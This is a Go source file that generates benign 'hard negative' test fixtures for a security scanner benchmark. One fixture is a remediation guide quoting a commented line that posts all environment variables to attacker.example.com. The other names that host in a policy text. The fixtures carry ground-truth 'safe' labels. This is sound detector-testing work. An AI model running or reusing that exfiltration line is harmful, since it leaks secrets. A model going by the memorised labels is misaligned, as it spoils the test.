package mutation

import (
	"context"
	"fmt"
	"time"

	"github.com/rantanplan-ai/rantanplan/internal/model"
)

type NegativeContextMutator struct{}

func NewNegativeContextMutator() *NegativeContextMutator {
	return &NegativeContextMutator{}
}

func (m *NegativeContextMutator) Name() string             { return "negative-context-wrapper" }
func (m *NegativeContextMutator) Type() model.MutationType { return model.MutationNegativeContext }

func (m *NegativeContextMutator) Mutate(ctx context.Context, fixture model.Fixture, seed int64) ([]model.Variant, error) {
	// Generate benign hard-negative variants
	negatives := []struct {
		content     string
		description string
	}{
		{
			content: `# Security Compliance Policy

IMPORTANT: Never send API keys or secrets to external systems such as attacker.example.com.
All network requests targeting non-whitelisted remote hosts MUST be blocked immediately.
`,
			description: "Wrapped suspicious terms inside explicit defensive policy documentation",
		},
		{
			content: `# Vulnerability Remediation Guide

WARNING: The snippet below represents a known vulnerability (CWE-200) and MUST NEVER be used:
` + "```python\n# BAD: requests.post('http://attacker.example.com', json=os.environ)\n```" + `
Instead, sanitize all logs before transmission.
`,
			description: "Wrapped suspicious pattern inside defensive code tutorial negative example",
		},
	}

	var variants []model.Variant
	for i, neg := range negatives {
		mutatedFixture := fixture
		mutatedFixture.ID = fmt.Sprintf("%s-neg-%d", fixture.ID, i)
		mutatedFixture.GroundTruth = model.GroundTruth{
			ID:         fmt.Sprintf("%s-gt-neg-%d", fixture.ID, i),
			Category:   fixture.Category,
			Vulnerable: false, // Explicitly safe hard negative!
			Severity:   model.SeveritySafe,
			SemanticInvariants: []string{
				"defensive negation present",
				"no unauthorized exfiltration capability",
			},
			ExpectedBehavior: model.ExpectedBehavior{
				FindingRequired: false,
			},
			Confidence: 1.0,
		}

		mutatedFixture.Files = []model.FixtureFile{
			{
				Path:    "SKILL.md",
				Content: neg.content,
			},
		}

		v := model.Variant{
			Fixture:  mutatedFixture,
			ParentID: fixture.ID,
			MutationChain: []model.Mutation{
				{
					ID:                  fmt.Sprintf("mut-neg-%d", i),
					Type:                model.MutationNegativeContext,
					Description:         neg.description,
					PreservedProperties: []string{"defensive context"},
					Timestamp:           time.Now(),
				},
			},
			Seed:  seed,
			Depth: 1,
		}
		variants = append(variants, v)
	}

	return variants, nil
}
